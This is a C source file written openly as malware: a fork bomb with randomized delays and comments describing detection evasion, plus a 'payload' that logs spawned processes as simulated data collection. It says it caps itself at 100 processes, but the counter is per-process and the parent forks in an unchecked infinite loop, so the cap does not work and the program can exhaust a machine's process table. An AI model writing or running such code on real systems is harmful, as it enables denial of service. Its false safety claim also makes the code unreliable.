#include <unistd.h>
#include <stdlib.h>
#include <time.h>
#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

// Configuration constants
#define MAX_PROCESSES 100    // Max processes to prevent system crash
#define DELAY_RANGE 500000   // Max delay in microseconds (0.5s)
#define LOG_FILE "/tmp/fork_log.txt" // Log file for payload

// Global counter for process limit
volatile int process_count = 0;

// Signal handler to clean up on SIGTERM
void cleanup(int signum) {
    // Open log file to record termination
    int fd = open(LOG_FILE, O_WRONLY | O_APPEND | O_CREAT, 0644);
    if (fd != -1) {
        char msg[64];
        snprintf(msg, sizeof(msg), "Process %d terminated.\n", getpid());
        write(fd, msg, strlen(msg));
        close(fd);
    }
    exit(0);
}

// Obfuscated function to perform fork
int spawn_process(void) {
    // Randomize delay to evade detection
    usleep(rand() % DELAY_RANGE);
    // Indirectly call fork to confuse static analysis
    return fork();
}

// Payload function to simulate malicious behavior
void execute_payload(void) {
    // Log process creation (simulating data collection)
    int fd = open(LOG_FILE, O_WRONLY | O_APPEND | O_CREAT, 0644);
    if (fd != -1) {
        char msg[64];
        snprintf(msg, sizeof(msg), "Process %d spawned at %ld.\n", getpid(), time(NULL));
        write(fd, msg, strlen(msg));
        close(fd);
    }
    // Add more payload logic here (e.g., network beacon, file access)
}

int main(int argc, char *argv[]) {
    // Seed random number generator for delays
    srand(time(NULL) ^ getpid());

    // Set up signal handler for cleanup
    signal(SIGTERM, cleanup);

    // Parse optional argument for max processes
    int max_procs = MAX_PROCESSES;
    if (argc > 1) {
        max_procs = atoi(argv[1]);
        if (max_procs <= 0) max_procs = MAX_PROCESSES;
    }

    // Check process limit
    if (process_count >= max_procs) {
        execute_payload();
        exit(0);
    }

    // Increment process counter
    process_count++;

    // Main fork loop with evasion
    while (1) {
        pid_t pid = spawn_process();
        if (pid < 0) {
            // Fork failed, log and exit
            int fd = open(LOG_FILE, O_WRONLY | O_APPEND | O_CREAT, 0644);
            if (fd != -1) {
                char msg[] = "Fork failed.\n";
                write(fd, msg, strlen(msg));
                close(fd);
            }
            exit(1);
        } else if (pid == 0) {
            // Child process: execute payload
            execute_payload();
            // Continue forking if below limit
            if (process_count < max_procs) {
                process_count++;
            } else {
                exit(0);
            }
        } else {
            // Parent process: random delay
            usleep(rand() % DELAY_RANGE);
        }
    }

    return 0;
}